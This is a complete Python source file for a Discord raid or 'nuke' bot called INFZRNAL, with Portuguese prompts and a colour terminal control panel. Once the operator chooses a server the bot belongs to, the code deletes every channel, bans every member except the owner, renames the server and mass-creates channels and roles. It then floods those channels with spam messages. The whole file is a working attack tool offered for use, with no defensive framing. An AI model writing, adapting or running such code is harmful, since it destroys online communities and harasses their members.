import asyncio
import discord
from discord.ext import commands
from colorama import Fore, Style, init
import threading
import time
import os 
from plyer import notification
from PIL import Image

init(autoreset=True)

# CONTADORES
users = 0
raids_feitos = 0
bots_online = 1

# TITULO ANIMADO
def atualizar_titulo():
    while True:
        os.system(f"title INFZRNAL │ Users: {users} │ Raids: {raids_feitos} │ Bots ON: {bots_online}")
        time.sleep(2)

threading.Thread(target=atualizar_titulo, daemon=True).start()

# CLEAR E BANNER
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def ascii_banner():
    art = r"""
 ▒█████   ██▓     ██░ ██  ▒█████     ▓█████▄  ▒█████     ▓█████▄  ██▓ ▄▄▄       ▄▄▄▄    ▒█████  
▒██▒  ██▒▓██▒    ▓██░ ██▒▒██▒  ██▒   ▒██▀ ██▌▒██▒  ██▒   ▒██▀ ██▌▓██▒▒████▄    ▓█████▄ ▒██▒  ██▒
▒██░  ██▒▒██░    ▒██▀▀██░▒██░  ██▒   ░██   █▌▒██░  ██▒   ░██   █▌▒██▒▒██  ▀█▄  ▒██▒ ▄██▒██░  ██▒
▒██   ██░▒██░    ░▓█ ░██ ▒██   ██░   ░▓█▄   ▌▒██   ██░   ░▓█▄   ▌░██░░██▄▄▄▄██ ▒██░█▀  ▒██   ██░
░ ████▓▒░░██████▒░▓█▒░██▓░ ████▓▒░   ░▒████▓ ░ ████▓▒░   ░▒████▓ ░██░ ▓█   ▓██▒░▓█  ▀█▓░ ████▓▒░
░ ▒░▒░▒░ ░ ▒░▓  ░ ▒ ░░▒░▒░ ▒░▒░▒░     ▒▒▓  ▒ ░ ▒░▒░▒░     ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░▒▓███▀▒░ ▒░▒░▒░ 
  ░ ▒ ▒░ ░ ░ ▒  ░ ▒ ░▒░ ░  ░ ▒ ▒░     ░ ▒  ▒   ░ ▒ ▒░     ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░▒░▒   ░   ░ ▒ ▒░ 
░ ░ ░ ▒    ░ ░    ░  ░░ ░░ ░ ░ ▒      ░ ░  ░ ░ ░ ░ ▒      ░ ░  ░  ▒ ░  ░   ▒    ░    ░ ░ ░ ░ ▒  
    ░ ░      ░  ░ ░  ░  ░    ░ ░        ░        ░ ░        ░     ░        ░  ░ ░          ░ ░  
                                      ░                   ░                          ░          
INFZRNAL ON 24H ANT PL 
    """
    term_width = os.get_terminal_size().columns
    print(Fore.RED + Style.BRIGHT + '\n'.join(line.center(term_width) for line in art.splitlines()))
    print()

# PROMPT
async def prompt(text):
    return await asyncio.get_event_loop().run_in_executor(None, lambda: input(Fore.RED + text + Style.RESET_ALL).strip())

# SEGURANÇA
async def safe(coro):
    try:
        return await coro
    except:
        return None

# COMANDOS PRINCIPAIS
async def delete_channels(guild):
    print(Fore.RED + "[+] Apagando todos os canais...")
    await asyncio.gather(*(safe(ch.delete()) for ch in guild.channels))

async def ban_all(guild, bot_user):
    print(Fore.RED + "[+] Banindo todos os membros...")
    members = [m for m in guild.members if not m.bot and m.id != bot_user.id and m.id != guild.owner_id]
    await asyncio.gather(*(safe(m.ban(reason="INFZRNAL NO CONTROLE")) for m in members))

async def create_channels(guild, name, amount):
    print(Fore.RED + f"[+] Criando {amount} canais...")
    return await asyncio.gather(*(safe(guild.create_text_channel(name)) for _ in range(amount)))

async def spam_all(channels, message, total):
    print(Fore.RED + "[+] Enviando spam em canais...")
    if not channels or total <= 0:
        return

    base = total // len(channels)
    extra = total % len(channels)

    tasks = []
    for i, ch in enumerate(channels):
        count = base + (1 if i < extra else 0)
        tasks.extend(safe(ch.send(message)) for _ in range(count))

    await asyncio.gather(*tasks)

async def rename_guild(guild, name):
    print(Fore.RED + f"[+] Renomeando servidor para '{name}'...")
    await safe(guild.edit(name=name))

# NOVA FUNÇÃO: SPAM DE CARGOS
async def spam_roles(guild, name, amount):
    print(Fore.RED + f"[+] Criando {amount} cargos...")
    await asyncio.gather(*(safe(guild.create_role(name=name)) for _ in range(amount)))

# PAINEL INTERATIVO
async def painel(bot):
    global users
    while True:
        clear()
        ascii_banner()
        print(Fore.RED + f"\n[{len(bot.guilds)}] servidores conectados:\n")
        for g in bot.guilds:
            print(Fore.RED + f"> {g.name} (ID: {g.id}) - {g.member_count} membros")

        guild_id = await prompt("\nDigite o ID do servidor alvo: ")
        guild = discord.utils.get(bot.guilds, id=int(guild_id)) if guild_id.isdigit() else None

        if not guild:
            print(Fore.RED + "[ERRO] Servidor não encontrado.")
            await asyncio.sleep(2)
            continue
        users += guild.member_count
        while True:
            clear()
            ascii_banner()
            print(Fore.RED + f"\nServidor selecionado: {guild.name} ({guild.member_count} membros)")
            print(Fore.RED + """
[1]  RAID 
[2]  SUBCOMANDOS
[0]  Voltar
""")
            op = await prompt("Escolha uma opção: ")

            if op == "1":
                await full_nuke(guild, bot)
            elif op == "2":
                await subcomandos(guild, bot)
            elif op == "0":
                break
            else:
                print(Fore.YELLOW + "Opção inválida.")
                await asyncio.sleep(1)

# RAID COMPLETO
async def full_nuke(guild, bot):
    global raids_feitos
    clear()
    ascii_banner()

    # NOTIFICAÇÃO + IMAGEM
    notification.notify(
        title="INFZRNAL NO CONTROLE 🏴",
        message="desculpa mais seu server foi fudido pela infzrnal",
        app_name="INFZRNAL"
    )
    try:
        Image.open("infzrnal.png").show()
    except:
        pass

    ch_count = await prompt("Qtd de canais para criar: ")
    spam_total = await prompt("Qtd total de mensagens de spam: ")
    spam_msg = await prompt("Mensagem de spam personalizada: ")

    try:
        ch_count = int(ch_count)
        spam_total = int(spam_total)
    except:
        ch_count = 50
        spam_total = 500

    await delete_channels(guild)
    await ban_all(guild, bot.user)
    await rename_guild(guild, "INFZRNAL")
    new_channels = await create_channels(guild, "infzrnal", ch_count)
    channels = [ch for ch in new_channels if ch]
    await spam_all(channels, spam_msg, spam_total)

    raids_feitos += 1
    print(Fore.GREEN + "\n[✓] RAID FINALIZADO!")
    await prompt("ENTER para continuar...")

# SUBCOMANDOS
async def subcomandos(guild, bot):
    while True:
        clear()
        ascii_banner()
        print(Fore.RED + "\nSUBCOMANDOS DISPONÍVEIS:\n")
        print(Fore.RED + """
[1] Apagar Canais       - Deleta todos os canais
[2] Banir Todos         - Bane todos os membros
[3] Criar Canais        - Cria vários canais com nome definido
[4] Enviar Spam         - Envia mensagens em todos os canais
[5] Renomear Servidor   - Altera o nome do servidor
[6] Spam de Cargos      - Cria vários cargos com nome definido
[0] Voltar              - Volta ao menu anterior
""")
        op = await prompt("Escolha: ")

        if op == "1":
            await delete_channels(guild)
            await prompt("Canais apagados. ENTER...")
        elif op == "2":
            await ban_all(guild, bot.user)
            await prompt("Membros banidos. ENTER...")
        elif op == "3":
            nome = await prompt("Nome dos canais: ")
            qtd = int(await prompt("Quantidade: "))
            await create_channels(guild, nome, qtd)
            await prompt("Canais criados. ENTER...")
        elif op == "4":
            msg = await prompt("Mensagem de spam: ")
            qtd = int(await prompt("Total de mensagens: "))
            await spam_all(guild.text_channels, msg, qtd)
            await prompt("Spam enviado. ENTER...")
        elif op == "5":
            nome = await prompt("Novo nome do servidor: ")
            await rename_guild(guild, nome)
            await prompt("Servidor renomeado. ENTER...")
        elif op == "6":
            nome = await prompt("Nome dos cargos: ")
            qtd = int(await prompt("Quantidade: "))
            await spam_roles(guild, nome, qtd)
            await prompt("Cargos criados. ENTER...")
        elif op == "0":
            break
        else:
            print(Fore.RED + "Opção inválida.")
            await asyncio.sleep(1)

# BOT SETUP
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await painel(bot)

@bot.event
async def on_command_error(ctx, error):
    pass

if __name__ == "__main__":
    clear()
    ascii_banner()
    token = input(Fore.RED + "ME DIGA SEU TOKEN FILHO DE SATÃ: " + Style.RESET_ALL).strip()
    bot.run(token)
